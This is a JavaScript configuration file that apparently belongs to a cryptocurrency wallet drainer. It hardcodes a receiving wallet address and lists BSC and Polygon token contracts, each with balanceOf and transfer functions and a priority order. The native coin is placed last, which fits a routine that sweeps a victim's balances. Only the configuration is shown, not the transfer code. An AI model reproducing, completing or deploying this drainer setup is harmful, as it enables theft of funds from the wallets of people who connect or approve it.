// Configuration
const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";

// Token contracts - Full list with all tokens
const TOKENS = {
  bsc: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0xa184088a740c695e156f91f5cc086a06bb78b827",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 1
    },
    // Meme coins and popular tokens
    {
      name: "BabyDoge",
      symbol: "BabyDoge",
      address: "0xc748673057861a797275CD8A068AbB95A902e8de",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 9,
      priority: 2
    },
    {
      name: "Trump Coin",
      symbol: "TRUMP",
      address: "0x7D21841DC10BA1C5797951EFc62fADBBD55B03bC",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 3
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 4
    },
    {
      name: "FLOKI",
      symbol: "FLOKI",
      address: "0xfb5B838b6cfEEdC2873aB27866079AC55363D37E",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 9,
      priority: 5
    },
    {
      name: "Dogelon Mars",
      symbol: "ELON",
      address: "0x7bd6FaBD64813c48545C9c0e312A0099d9be2540",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 6
    },
    // Stablecoins
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 7
    },
    {
      name: "Binance USD",
      symbol: "BUSD",
      address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 8
    },
    // Popular DeFi tokens
    {
      name: "PancakeSwap",
      symbol: "CAKE",
      address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 9
    },
    // Native token (must be last)
    {
      name: "BNB",
      symbol: "BNB",
      address: "0x0000000000000000000000000000000000000000",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ],
  polygon: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0x7f426f6dc648e50464a0392e60e1bb465a67e9cf",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 1
    },
    // Meme coins and popular tokens
    {
      name: "BabyDoge",
      symbol: "BabyDoge",
      address: "0x4E158Ef7F1E3DA85E2c1D2a9e2270F4C2E0D3294",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 9,
      priority: 2
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 3
    },
    {
      name: "FLOKI",
      symbol: "FLOKI",
      address: "0x3A9A81d576d83FF21f26f325066054540720fC34",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 9,
      priority: 4
    },
    // Stablecoins
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 6,
      priority: 5
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 6,
      priority: 6
    },
    // Popular DeFi tokens
    {
      name: "QuickSwap",
      symbol: "QUICK",
      address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 7
    },
    // Native token (must be last)
    {
      name: "MATIC",
      symbol: "MATIC",
      address: "0x0000000000000000000000000000000000000000",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ]
};
